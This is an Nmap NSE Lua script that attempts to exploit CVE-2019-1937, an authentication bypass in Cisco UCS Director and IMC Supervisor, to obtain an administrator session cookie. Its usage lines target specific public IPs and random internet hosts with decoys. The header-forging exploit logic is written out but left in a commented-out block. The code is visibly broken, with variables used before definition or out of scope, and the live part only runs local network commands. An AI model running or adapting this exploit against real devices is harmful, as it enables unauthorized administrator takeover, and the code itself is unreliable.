---
-- Nmap NSE cisco-cve-2019-1937.nse - Version 1.2
-- Copy to: /usr/share/nmap/scripts/cisco-cve-2019-1937.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help cisco-cve-2019-1937.nse
-- Port(s) accepted by this nse: 80-86,443,8080-8086
--
-- Affected versions: confirmed in Cisco UCS Director versions 6.6.0 to 6.7.0
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it {Disclosure = Pedro Ribeiro}
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.

Some Syntax examples:
nmap --script-help cisco-cve-2019-1937.nse
nmap -sV -T4 -Pn -n -p 80-86,443,8080 --open --script cisco-cve-2019-1937.nse 137.44.25.194
nmap -sV -Pn -n -p 80,443 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "uri=/vdeo/cgi/loginDefaultUser,verbose=true" 137.44.25.194
nmap -sS -Pn -p 80,86 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3,verbose=true" 50.117.40.77
nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,443,8080-8086 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help cisco-cve-2019-1937.nse
-- nmap -sV -T4 -Pn -n -p 80-86,8080 --open --script cisco-cve-2019-1937.nse 137.44.25.194
-- nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
-- nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "uri=/vdeo/cgi/loginDefaultUser,verbose=true" 137.44.25.194
-- nmap -sS -Pn -p 80,86 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3,verbose=true" 50.117.40.77
-- nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,8080-8086 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 443/tcp open  https  Apache httpd 2.4.38
-- | cisco-cve-2019-1937:
-- |   VULNERABLE:
-- |   Cisco UCS Supervisor (Web Interface Auth Bypass)
-- |   State: VULNERABLE
-- |   IDs:  CVE:CVE-2019-1937
-- |   Risk factor: Critical  CVSSv2: 10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)
-- |     A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
-- |     Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
-- |     to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
-- |     is due to insufficient request header validation during the authentication process. An attacker could exploit this
-- |     vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
-- |     to use the acquired session token to gain full administrator access to the affected device.
-- |
-- |   Disclosure date: 2019-Ago-21
-- |   Exploit results:
-- |     Uri: http://192.168.1.71:443/app/ui/ClientServlet?apiName=GetUserInfo
-- |     Auth-Cookie: JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC74;
-- |     LoginAccess: admin
-- |
-- |   Referencies:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2019-1937
-- |     https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby
-- |     https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html
-- |_
-- @args verbose => Display More verbose outputs      - Default: false
-- @args User-Agent => User-Agent to send in requests - Default: Android; Mobile
-- @args uri => the URL path to search in host.ip     - Default: /app/ui/ClientServlet?apiName=GetUserInfo
---


author = "r00t-3xp10it"
copyright = "Pedro Ribeiro"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "vuln"}


-- DEPENDENCIES (lua nse libs) --
local http = require "http"
local table = require "table"
local vulns = require "vulns"
local string = require "string"
local stdnse = require "stdnse" --> nse args usage
local shortport = require "shortport"


-- THE RULE SECTION --
-- Scan only the selected ports/proto/service_names in 'open state'
portrule = shortport.port_or_service({80, 443, 8080}, "http, https, http-simple-new, http-proxy", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
local verbose = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/app/ui/ClientServlet?apiName=GetUserInfo"


local ip_addr, vuln_state
-- Capture distro flavor { windows | Linux }
local socket = io.popen("ver 2>&1") --> supress io.popen() stdout error msg (2>&1)
flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
socket.close()

if ( flavor == nil or flavor == "" or string.find(flavor, "not found") ) then
   local socket = io.popen("uname -s")
   flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
   socket.close()
end


   if (string.find(flavor, "Linux")) then
      -- Executing BASH command(s) and storing results
      -- Storing network interface in use { wlan0 | eth0 }
      local socket = io.popen("netstat -r|grep 'default'|awk {'print $8'}")
      local int_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from interface
      socket:close()

      -- Storing Internal IP address to be used in header['host'] and header['referer']
      local socket = io.popen("ifconfig "..int_addr.."|grep -m 1 'inet'|awk {'print $2'}")
      ip_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from ip addr
      socket:close()
   else
      -- Executing CMD command(s) and storing results
      -- Storing Internal IP address to be used in header['host'] and header['referer']
      local socket = io.popen("ipconfig|FINDSTR IPv4")
      ip_addr = socket:read("*a"):gsub("Autoconfiguration IPv4 Address. . : ", ""):gsub("\n", "")
      socket.close()
   end


--[[
-- Manipulate TCP packet 'header'
local _decoy = {header={}}   --> manipulate 'header' request ..
_decoy['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".User-Agent") or "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/45.0"
_decoy['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
_decoy['header']['Cache-Control'] = "no-store"
_decoy['header']['Host'] = ip_addr
_decoy['header']['Referer'] = "http://"..ip_addr.."/"
_decoy['header']['X-Requested-With'] = "XMLHttpRequest"


-- Grab redirection url to use on next GET request
local response = http.get(host, port, uri, _decoy { no_cache = true, no_cache_body = true })
if ( not(response or response.status) ) then
   uri = "false"
elseif (response and response.status == 302) then
   local redirection = response.header and response.header['Location'] or ""
   if ( not(redirection == nil or redirection == "") ) then
      if (port.number == 443) then
         uri = redirection:gsub("Location: https://", ""):gsub(ip_addr, "")
      else
         uri = redirection:gsub("Location: http://", ""):gsub(ip_addr, "")
      end
   else
      uri = "false"
   end
elseif (response and response.status ~= 302) then
   uri = "false"
end


-- Follow the redirection uri to capture Set-Cookie { auth cookie }
-- eg. JSESSIONID=95B8A2D15F1E0712B444F208E179AE2354E374CF31974DE2D2E1C14173EAC745; Path=/app; Secure; HttpOnly
if ( not(uri == "false") ) then
   local res = http.get(host, port, uri, _decoy { no_cache = true, no_cache_body = true })
   if ( not(res or res.status) ) then
      return nil
   elseif (res and res.status == 200) then
      local set_cookie = response.header and response.header['Set-Cookie'] or ""
      if ( not(set_cookie == nil or set_cookie == "") ) then
         local parse_cookie = set_cookie:gsub("Set-Cookie: ", ""):gsub("; Path=/app; Secure; HttpOnly", "")
         vuln_state = "Vulnerable"
      else
         vuln_state = "Not Vulnerable"
      end
   elseif (response and response.status ~= 200) then
      vuln_state = "Not Vulnerable"
   end
else
   uri = "false"
end


if ( vuln_state == "Vulnerable" ) then
uri = "/app/ui/ClientServlet?apiName=GetUserInfo"
   local _send = {header={}}   --> manipulate 'header' request ..
   _send['header']['User-Agent'] = stdnse.get_script_args(SCRIPT_NAME..".User-Agent") or "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/45.0"
   _send['header']['Accept-Language'] = "en-GB,en;q=0.8,sv"
   _send['header']['Cache-Control'] = "no-store"
   _send['header']['Host'] = ip_addr
   _send['header']['Referer'] = "http://"..ip_addr.."/"
   _send['header']['X-Requested-With'] = "XMLHttpRequest"
   _send['header']['X-Starship-UserSession-Key'] = "ssa"
   _send['header']['X-Starship-Request-Key'] = "redteam"
   _send['header']['Cookie'] = parse_cookie..";"

   local vuln_test = http.get(host, port, uri, _send { no_cache = true, no_cache_body = true })
   if (vuln_test.status == 200) then
      vuln_table.state = vulns.STATE.VULN
      local report = vulns.Report:new(SCRIPT_NAME, host, port)
      return report:make_output(vuln_table)
   elseif (vuln_test.status ~= 200 and verbose == "true") then
      return "\n  Cisco UCS Supervisor (Web Interface Auth Bypass)\n  State: NOT VULNERABLE to CVE-2019-1937\n\n"
   end
end


-- Build Nmap vulnerable {table}
local vuln_table = {
   title = "Cisco UCS Supervisor (Web Interface Auth Bypass)",
   state = vulns.STATE.NOT_VULN,
   IDS = {CVE = 'CVE-2019-1937'},
   risk_factor = "Critical",
      scores = {
         CVSSv2 = "10.0 CRITICAL (AV:N/AC:L/Au:N/C:C/I:C/A:C)",
      },
   description = [[
A vulnerability in the web-based management interface of Cisco Integrated Management Controller (IMC) Supervisor,
Cisco UCS Director, and Cisco UCS Director Express for Big Data could allow an unauthenticated, remote attacker
to acquire a valid session token with administrator privileges, bypassing user authentication. The vulnerability
is due to insufficient request header validation during the authentication process. An attacker could exploit this
vulnerability by sending a series of malicious requests to an affected device. An exploit could allow the attacker
to use the acquired session token to gain full administrator access to the affected device.
]]

--[[,
   references = {
     'https://nvd.nist.gov/vuln/detail/CVE-2019-1937',
     'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190821-imcs-ucs-authby',
     'https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html',
   },
   dates = {
      disclosure = {year = '2019', month = 'Ago', day = '21'},
   },
   exploit_results = {}, --> Display auth cookie and creds
}


-- Build vulnerable stdout (Display auth cookie and creds)
if (uri_found == "true" and auth_stats == "true") then
   table.insert(vuln_table.exploit_results, string.format("Uri: http://"..host.ip..":"..port.number..uri))
   table.insert(vuln_table.exploit_results, string.format("Auth-Cookie: "..cookie_value))
   table.insert(vuln_table.exploit_results, string.format("LoginAccess: "..capt_creds.."\n"))
end

--]]


   -- Print Internal ip address captured (develop stage)..
   -- Build header['Referer'] string based on host.ip - port.number
   if (port.number == 443) then
      return "\n Flavor: "..flavor.."\n  Host: "..ip_addr.."\n  Referer: https://"..ip_addr.."/\n\n"
   elseif (port.number == 80 or port.number == 8080) then
      return "\n Flavor: "..flavor.."\n  Host: "..ip_addr.."\n  Referer: http://"..ip_addr.."/\n\n"
   else
      return "\n Flavor: "..flavor.."\n  Host: "..ip_addr.."\n  Referer: http://"..ip_addr.."/\n\n"
   end
end
